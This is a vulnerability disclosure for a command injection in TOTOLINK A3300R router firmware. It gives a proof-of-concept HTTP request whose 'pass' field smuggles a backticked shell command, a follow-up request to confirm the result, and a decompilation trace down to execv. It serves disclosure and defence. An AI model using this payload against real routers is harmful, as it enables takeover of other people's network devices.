# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection
### Discoverer
Yangyi
## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setTr069Cfg` request,`pass` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=F30C610BF2E2EC8B HTTP/1.1
Host: itotolink.net
Content-Length: 303
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/tr069_cfg.html?token=F30C610BF2E2EC8B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"addEffect":"0","enable":"1","url":"192.168.123.234","user":"123","pass":"123`ls>/web/678.txt`","informEnable":"0","interval":"","stunEnable":"1","stunServerAddr":"192.168.123.234","stunPort":"4343","stunMaxAlive":"3600","stunMinAlive":"30","stun_user":"123","stun_pass":"123","topicurl":"setTr069Cfg"}
```

injection the command "ls>/web/678.txt"

![image-20240109131637580](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/6/img/image-20240109131637580.png)

check the result.

```
GET /678.txt HTTP/1.1
Host: itotolink.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://itotolink.net/advance/tr069_cfg.html?token=F30C610BF2E2EC8B
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```

![image-20240109133424560](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/6/img/image-20240109133424560.png)

## Analysis

sub_4100F0 will handle the `setTr069Cfg` request. sub_4100F0 get `pass` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240109133328195](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/6/img/image-20240109133328195.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/img/image-20240109131330610.png)
